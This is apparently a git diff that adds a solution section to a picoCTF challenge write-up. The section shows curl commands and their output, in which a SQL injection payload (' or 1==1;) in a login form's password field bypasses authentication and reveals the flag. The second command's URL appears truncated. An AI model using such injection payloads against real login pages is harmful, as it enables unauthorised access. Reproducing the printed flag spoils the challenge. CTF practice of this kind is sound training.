@@ -10,3 +10,18 @@ There is a website running at `https://jupiter.challenges.picoctf.org/problem/3
 
 
 ### Solucion
+```
+karymeZapmen-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username-admin&password=password&debug=1"
+<pre>username: 
+password: password
+SQL query: SELECT * FROM users WHERE name='' AND password='password'
+</pre><h1>Login failed.</h1>
+
+karymeZapmen-picoctf@webshell:~$ curl -s https://jupiter.cm/33850/login.php -d "username-admin&password=' or 1==1;&debug=1" 
+<pre>username: 
+password: ' or 1==1;
+SQL query: SELECT * FROM users WHERE name='' AND password='' or 1==1;'
+</pre><h1>Logged in!</h1><p>
+
+Your flag is: picoCTF{s0m3_SQL_f8adf3fb}</p>
+```
